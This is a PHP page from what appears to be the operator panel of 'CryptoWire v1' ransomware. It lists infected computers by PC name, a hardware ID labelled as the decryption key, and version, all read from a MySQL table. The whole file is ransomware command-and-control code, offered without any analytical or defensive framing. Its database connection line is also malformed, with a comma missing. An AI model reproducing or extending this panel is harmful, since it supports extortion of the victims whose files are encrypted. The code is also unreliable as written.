<?php 
	include("include/sessions.php");
	
	session_start();
?>

<html>
	<head>
		<title>CryptoWire v1 | LIST OF INFECTIONS</title>
		<script src="javascript/info.js"></script>
		<link rel="stylesheet" href="css/styles.css">
	</head>
	<body>
		<ul>
			<li><a class="active" href="info.php">List of Infections</a></li>
			<li><a href="settings.php">Configure</a></li>
			<li><a href="index.php">Logout</a></li>
		</ul>
		<section>
			<!--for demo wrap-->
			<h1>List of Infections</h1>
			
			<div class="tbl-header">
				<table cellpadding="0" cellspacing="0" border="0">
					<thead>
						<tr>
							<th>PC Name</th>
							<th>HWID (Decryption Key)</th>
							<th>Version</th>
						</tr>
					</thead>
				</table>
			</div>
			
			<?php
				$server = mysqli_connect("<hostname>" "<username>", "<password>", "<database>");
				$query = mysqli_query($server, "select * from computer_list");
			?>
			
			<div class="tbl-content">
				<table cellpadding="0" cellspacing="0" border="0">
					<tbody>
						<?php
							while ($row = mysqli_fetch_array($query)) {
								echo "<tr>";
									echo "<td>".$row['pcname']."</td>";
									echo "<td>".$row['hwid']."</td>";
									echo "<td>".$row['version']."</td>";
								echo "</tr>";
							}
						?>
					</tbody>
				</table>
			</div>
		</section>
	</body>
</html>
